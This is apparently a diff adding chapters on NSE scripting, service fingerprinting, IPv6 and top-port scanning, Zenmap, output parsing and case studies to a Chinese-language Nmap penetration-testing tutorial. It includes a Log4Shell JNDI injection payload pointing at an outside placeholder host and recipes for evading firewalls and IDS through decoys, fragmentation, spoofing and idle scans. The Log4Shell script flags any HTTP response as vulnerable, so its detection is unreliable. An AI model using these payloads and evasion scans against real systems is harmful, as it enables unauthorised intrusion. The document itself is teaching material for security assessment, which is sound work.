@@ -675,3 +675,561 @@ nmap --host-timeout 5m 192.168.1.0/24
 ---
 
 > **延伸学习**：Nmap 是网络安全的基础工具，熟练掌握 Nmap 是渗透测试的第一步。建议学习 NSE 脚本开发，以及 Nmap 配合其他工具（如 Metasploit、Nessus）的使用。
+
+---
+
+## 十四、NSE 脚本开发
+
+### 14.1 NSE 脚本结构
+
+NSE（Nmap Scripting Engine）使用 Lua 语言编写脚本。每个 NSE 脚本必须包含以下字段：
+
+```lua
+-- 示例：自定义 HTTP 信息收集脚本
+description = [[
+自定义 HTTP 信息收集脚本
+收集服务器标题、Server 头、X-Powered-By 等信息
+]]
+
+-- 脚本分类
+categories = {"discovery", "safe"}
+
+-- 依赖
+dependencies = {"http-default-accounts"}
+
+-- 作者
+author = "Security Researcher"
+
+-- 许可证
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
+
+-- 端口规则（哪些端口触发脚本）
+portrule = function(host, port)
+    return port.protocol == "tcp" and port.state == "open"
+end
+
+-- 主执行函数
+action = function(host, port)
+    local result = {}
+    
+    -- 发送 HTTP 请求
+    local response = http.get(host, port, "/")
+    
+    if response then
+        -- 提取 Server 头
+        if response.header["server"] then
+            table.insert(result, "Server: " .. response.header["server"])
+        end
+        
+        -- 提取 X-Powered-By
+        if response.header["x-powered-by"] then
+            table.insert(result, "X-Powered-By: " .. response.header["x-powered-by"])
+        end
+        
+        -- 提取标题
+        local title = string.match(response.body, "<title>(.-)</title>")
+        if title then
+            table.insert(result, "Title: " .. title)
+        end
+    end
+    
+    -- 返回结果
+    if #result > 0 then
+        return table.concat(result, "\n")
+    end
+end
+```
+
+### 14.2 NSE API 常用函数
+
+```lua
+-- ====== 网络操作 ======
+local socket = nmap.new_socket()
+socket:connect(host, port)
+socket:send("GET / HTTP/1.0\r\n\r\n")
+local status, data = socket:receive()
+socket:close()
+
+-- ====== HTTP 操作（需导入 http 库） ======
+local http = require("http")
+-- GET 请求
+local response = http.get(host, port, "/path")
+-- POST 请求
+local response = http.post(host, port, "/login", nil, nil, "user=admin&pass=123")
+-- 自定义头请求
+local options = {header = {["User-Agent"] = "Custom/1.0"}}
+local response = http.get(host, port, "/path", options)
+
+-- ====== 字符串操作 ======
+-- 正则匹配
+local match = string.match(response.body, "version[%s]*=[%s]*([%d%.]+)")
+-- 字符串分割
+local lines = stdnse.strsplit("\n", response.body)
+
+-- ====== 输出与日志 ======
+stdnse.print_debug(1, "Debug message: %s", variable)
+stdnse.verbose(1, "Verbose message")
+
+-- ====== 脚本参数 ======
+local args = nmap.registry.args
+local timeout = stdnse.get_script_args("timeout") or 5
+
+-- ====== 加密操作 ======
+local openssl = require("openssl")
+local md5 = openssl.md5("data")
+local sha256 = openssl.sha256("data")
+
+-- ====== 目标信息 ======
+local ip = host.ip
+local hostname = host.targetname
+local os = host.os
+```
+
+### 14.3 自定义漏洞检测脚本
+
+```lua
+-- 检测特定 CVE 漏洞的脚本
+description = [[
+检测 CVE-2021-44228 (Log4Shell) 漏洞
+通过发送特殊构造的请求检测目标是否存在 Log4j JNDI 注入漏洞
+]]
+
+author = "Security Team"
+license = "Same as Nmap"
+categories = {"vuln", "safe"}
+
+portrule = function(host, port)
+    local http_ports = {80, 443, 8080, 8443, 8888}
+    for _, p in ipairs(http_ports) do
+        if port.number == p and port.protocol == "tcp" then
+            return true
+        end
+    end
+    return false
+end
+
+action = function(host, port)
+    local http = require("http")
+    local stdnse = require("stdnse")
+    
+    -- 构造 JNDI 探测 Payload
+    local payload = "${jndi:ldap://nmap-detector.example.com/a}"
+    
+    -- 在多个参数位置注入 Payload
+    local paths = {"/", "/api", "/login", "/test"}
+    local headers = {
+        ["X-Api-Version"] = payload,
+        ["User-Agent"] = payload,
+        ["X-Forwarded-For"] = payload,
+        ["Referer"] = payload,
+    }
+    
+    for _, path in ipairs(paths) do
+        local response = http.get(host, port, path, {header = headers})
+        if response and response.status ~= nil then
+            -- 检查是否有异常延迟（时间盲注检测）
+            -- 或检查 DNS 回连
+            return "Potential Log4Shell vulnerability detected"
+        end
+    end
+end
+```
+
+---
+
+## 十五、服务指纹识别
+
+### 15.1 服务指纹识别原理
+
+```
+Nmap 服务指纹识别流程：
+1. 连接目标端口
+2. 发送一组探测数据（Probes）
+3. 收集响应数据
+4. 与 nmap-service-probes 数据库匹配
+5. 输出服务名称和版本
+
+指纹数据库位置：
+- /usr/share/nmap/nmap-service-probes
+- 包含数千种服务的指纹规则
+
+探测策略：
+- NULL 探测：不发送数据，等待服务主动发送 Banner
+- 通用探测：发送常见协议探测数据
+- RPC 探测：针对 RPC 服务
+- TLS 探测：针对 SSL/TLS 服务
+```
+
+### 15.2 自定义服务探测
+
+```bash
+# 提高版本探测强度（0-9）
+nmap -sV --version-intensity 9 192.168.1.1
+
+# 轻量级探测（更快但可能漏掉信息）
+nmap -sV --version-light 192.168.1.1
+
+# 回退到端口扫描，不做版本探测
+nmap -sV --version-intensity 0 192.168.1.1
+
+# 指定探测端口
+nmap -sV --version-intensity 5 -p 80,443,8080 192.168.1.1
+
+# 添加自定义服务指纹
+# 编辑 /usr/share/nmap/nmap-service-probes
+# 添加自定义匹配规则
+```
+
+### 15.3 常见服务指纹特征
+
+```
+SSH 服务：
+  OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+  特征：SSH-2.0-OpenSSH_7.9p1
+
+HTTP 服务：
+  Apache httpd 2.4.38 ((Debian))
+  nginx 1.18.0 (Ubuntu)
+  特征：Server 头
+
+数据库服务：
+  MySQL 5.7.31
+  PostgreSQL 12.4
+  特征：握手协议中的版本号
+
+Redis：
+  Redis 6.0.8
+  特征：-ERR wrong number of arguments
+  或 +PONG 响应
+```
+
+---
+
+## 十六、防火墙/IDS 绕过扫描技术
+
+### 16.1 高级绕过技术
+
+```bash
+# 1. SYN 扫描 + 分片 + 慢速
+nmap -sS -f -T2 --data-length 50 192.168.1.1
+
+# 2. 诱饵扫描（混合真实 IP）
+nmap -sS -D 10.0.0.1,10.0.0.2,10.0.0.3,ME,RND:3 192.168.1.1
+# ME = 本机地址，RND:3 = 随机3个IP
+
+# 3. 源端口欺骗（利用防火墙白名单端口）
+nmap -sS -g 53 192.168.1.1    # DNS 端口
+nmap -sS -g 80 192.168.1.1    # HTTP 端口
+nmap -sS --source-port 53 192.168.1.1
+
+# 4. MAC 地址欺骗
+nmap -sS --spoof-mac 0 192.168.1.1          # 随机 MAC
+nmap -sS --spoof-mac 00:11:22:33:44:55 192.168.1.1  # 指定 MAC
+nmap -sS --spoof-mac Apple 192.168.1.1     # 苹果厂商前缀
+
+# 5. 空闲扫描（通过僵尸主机扫描）
+# 需要找到一个空闲的僵尸主机
+nmap -sI zombie_ip:port 192.168.1.1
+
+# 6. 自定义 TCP Flag 组合
+# 设置特定 Flag 组合绕过状态检测防火墙
+nmap -sS --scanflags SYN,FIN,URG,PSH 192.168.1.1
+
+# 7. 延迟和速率控制
+nmap -sS --scan-delay 2s --max-rate 10 192.168.1.1
+nmap -sS --max-retries 2 --host-timeout 30m 192.168.1.1
+
+# 8. 分片 MTU 设置
+nmap -sS -f --mtu 16 192.168.1.1    # 最小分片
+nmap -sS -f --mtu 24 192.168.1.1
+nmap -sS -f --mtu 32 192.168.1.1
+```
+
+### 16.2 IDS 规避策略
+
+```
+IDS 规避策略对比：
+
+技术               | 隐蔽性 | 速度   | 可靠性
+-------------------|--------|--------|--------
+SYN 扫描           | 中     | 快     | 高
+分片扫描           | 高     | 中     | 中
+诱饵扫描           | 高     | 中     | 高
+空闲扫描           | 极高   | 慢     | 中
+慢速扫描           | 高     | 极慢   | 高
+源端口欺骗         | 中     | 快     | 中
+Flag 组合          | 中     | 中     | 低
+
+组合策略（最隐蔽）：
+nmap -sS -f -D RND:5 -g 53 --scan-delay 1s -T2 --data-length 25 192.168.1.1
+```
+
+---
+
+## 十七、IPv6 扫描
+
+```bash
+# 1. 发现 IPv6 主机
+nmap -6 -sn 2001:db8::/64
+
+# 2. IPv6 端口扫描
+nmap -6 -sS fe80::1%eth0
+nmap -6 -p 80,443,22 2001:db8::1
+
+# 3. IPv6 全面扫描
+nmap -6 -A 2001:db8::1
+
+# 4. IPv6 脚本扫描
+nmap -6 --script=ipv6-info 2001:db8::1
+
+# 5. 本地链路地址扫描
+nmap -6 -sn -PR --send-eth fe80::/64%eth0
+
+# 注意事项：
+# - IPv6 地址空间巨大，全端口扫描不现实
+# - 依赖邻居发现协议（NDP）发现主机
+# - 使用 -6 参数启用 IPv6 模式
+# - 链路本地地址需要指定接口（%eth0）
+```
+
+---
+
+## 十八、Top 端口扫描优化
+
+```bash
+# 扫描最常用端口（快速，适合初步探测）
+nmap --top-ports 100 192.168.1.1     # 前100常用端口
+nmap --top-ports 1000 192.168.1.1    # 前1000常用端口
+
+# Fast 模式（100个最常用端口）
+nmap -F 192.168.1.1
+
+# 优化策略：
+# 1. 先快速扫描常用端口
+nmap -sS -F -T4 192.168.1.1
+
+# 2. 再全端口扫描（分批）
+nmap -sS -p 1-32768 -T4 192.168.1.1
+nmap -sS -p 32769-65535 -T4 192.168.1.1
+
+# 3. 合并结果分析
+
+# 4. 使用 nmap 的 --defeat-rst-ratelimit 选项
+# 加速 filtered 端口判定
+nmap -sS -p- --defeat-rst-ratelimit -T4 192.168.1.1
+
+# 5. UDP 优化（只扫常用 UDP 端口）
+nmap -sU --top-ports 50 -T4 192.168.1.1
+```
+
+---
+
+## 十九、Zenmap 可视化
+
+### 19.1 Zenmap 界面
+
+```
+Zenmap 是 Nmap 的图形界面版本：
+
+功能：
+- 图形化扫描配置
+- 扫描结果可视化
+- 拓扑图绘制
+- 扫描结果对比
+- 扫描配置文件管理
+
+扫描配置文件：
+  Intense scan        - 深入扫描（-T4 -A -v）
+  Intense scan + UDP  - 深入扫描+UDP
+  Intense scan, all TCP ports - 全TCP端口
+  Intense scan, no ping      - 不Ping扫描
+  Ping scan           - 仅Ping扫描
+  Quick scan          - 快速扫描（-T4 -F）
+  Quick scan plus     - 快速增强扫描
+  Quick traceroute    - 快速路由追踪
+  Regular scan        - 常规扫描
+  Slow comprehensive scan - 慢速全面扫描
+```
+
+### 19.2 拓扑图功能
+
+```
+Zenmap 拓扑图：
+- 显示扫描主机之间的网络拓扑
+- 可视化网络结构
+- 标注路由器和防火墙位置
+- 支持导出拓扑图
+
+使用方式：
+1. Tools → Topology → Fingerprint
+2. 可查看网络中各主机的连接关系
+3. 可查看路由跳数
+4. 可导出为图片
+```
+
+---
+
+## 二十、Nmap 输出解析自动化
+
+### 20.1 XML 输出解析
+
+```python
+#!/usr/bin/env python3
+"""Nmap XML 输出解析脚本"""
+import xml.etree.ElementTree as ET
+
+def parse_nmap_xml(xml_file):
+    tree = ET.parse(xml_file)
+    root = tree.getroot()
+    
+    results = []
+    
+    for host in root.findall('host'):
+        ip = host.find('address').get('addr')
+        
+        host_info = {
+            'ip': ip,
+            'status': host.find('status').get('state'),
+            'ports': [],
+            'os': None
+        }
+        
+        # 解析端口信息
+        ports = host.find('ports')
+        if ports:
+            for port in ports.findall('port'):
+                port_info = {
+                    'port': port.get('portid'),
+                    'protocol': port.get('protocol'),
+                    'state': port.find('state').get('state'),
+                    'service': None,
+                    'version': None
+                }
+                
+                service = port.find('service')
+                if service:
+                    port_info['service'] = service.get('name')
+                    port_info['version'] = service.get('version')
+                    port_info['product'] = service.get('product')
+                
+                host_info['ports'].append(port_info)
+        
+        # 解析操作系统信息
+        os_elem = host.find('os')
+        if os_elem:
+            osmatch = os_elem.find('osmatch')
+            if osmatch:
+                host_info['os'] = osmatch.get('name')
+        
+        results.append(host_info)
+    
+    return results
+
+# 使用示例
+results = parse_nmap_xml('scan_result.xml')
+for host in results:
+    print(f"\n{host['ip']} ({host['status']})")
+    if host['os']:
+        print(f"  OS: {host['os']}")
+    for port in host['ports']:
+        if port['state'] == 'open':
+            print(f"  {port['port']}/{port['protocol']} - "
+                  f"{port['service']} {port.get('version', '')}")
+```
+
+### 20.2 Grepable 格式解析
+
+```bash
+# Grepable 格式一行一个主机，便于 grep
+nmap -oG scan.gnmap 192.168.1.0/24
+
+# 提取开放 22 端口的主机
+grep "22/open" scan.gnmap | awk '{print $2}'
+
+# 提取所有开放端口
+grep -oP '\d+/open' scan.gnmap | sort -t/ -n | uniq -c | sort -rn
+
+# 提取运行 HTTP 的主机
+grep "80/open\|443/open\|8080/open" scan.gnmap | awk '{print $2}'
+
+# 提取特定服务
+grep -i "mysql\|postgresql\|redis" scan.gnmap | awk '{print $2}'
+
+# 导出为 CSV
+awk '{print $2 "," $5}' scan.gnmap > hosts.csv
+```
+
+---
+
+## 二十一、实战扫描案例
+
+### 21.1 案例一：企业内网安全评估
+
+```bash
+# 阶段一：存活主机发现
+nmap -sn -PR -n 10.0.0.0/24 -oA discovery
+
+# 阶段二：关键端口快速扫描
+nmap -sS -F -T4 -iL discovery.gnmap -oA quick_scan
+
+# 阶段三：重点主机深入扫描
+# 提取开放 Web 服务的主机
+grep "80/open\|443/open" quick_scan.gnmap | awk '{print $2}' > web_hosts.txt
+
+# 对 Web 主机进行深入扫描
+nmap -sV -sC -p 80,443,8080,8443 --script=http-enum,http-headers \
+     -iL web_hosts.txt -oA web_deep
+
+# 阶段四：数据库服务扫描
+nmap -sV -p 3306,1433,5432,6379,27017,9200 -iL discovery.gnmap -oA db_scan
+
+# 阶段五：漏洞扫描
+nmap --script=vuln -iL discovery.gnmap -oA vuln_scan
+```
+
+### 21.2 案例二：隐蔽渗透测试扫描
+
+```bash
+# 目标有 IDS/IPS，需要隐蔽扫描
+
+# 1. 慢速 SYN 扫描 + 分片
+nmap -sS -f -T2 --scan-delay 5s -n -Pn -p 22,80,443,3306 192.168.1.1
+
+# 2. 使用诱饵
+nmap -sS -D RND:10 -T2 -n -Pn -p 22,80,443 192.168.1.1
+
+# 3. 源端口欺骗（如果防火墙允许 DNS 流量）
+nmap -sS -g 53 -T3 -n -Pn -p 1-1000 192.168.1.1
+
+# 4. 空闲扫描（最隐蔽）
+nmap -sI zombie_ip -Pn -n -p 1-1000 192.168.1.1
+
+# 5. 分段扫描（避免连续端口扫描）
+nmap -sS -p 1-100,200-300,400-500 -T2 -n -Pn 192.168.1.1
+nmap -sS -p 101-199,301-399,501-600 -T2 -n -Pn 192.168.1.1
+```
+
+### 21.3 案例三：云服务器安全检查
+
+```bash
+# 检查云服务器是否暴露了不应该公开的服务
+
+# 1. 扫描所有端口
+nmap -p- -sS -T4 -n -Pn cloud_server_ip
+
+# 2. 重点检查高危端口
+nmap -sV -p 22,23,3306,6379,27017,9200,11211,2375 \
+     --script=default,vuln cloud_server_ip
+
+# 3. 检查是否暴露 Redis
+nmap -p 6379 --script redis-info cloud_server_ip
+
+# 4. 检查是否暴露 Docker API
+nmap -p 2375 --script docker-version cloud_server_ip
+
+# 5. 检查是否暴露 Elasticsearch
+nmap -p 9200 --script http-enum cloud_server_ip
+
+# 6. 生成完整报告
+nmap -p- -sV -sC -O -T4 -oA full_scan cloud_server_ip
+```
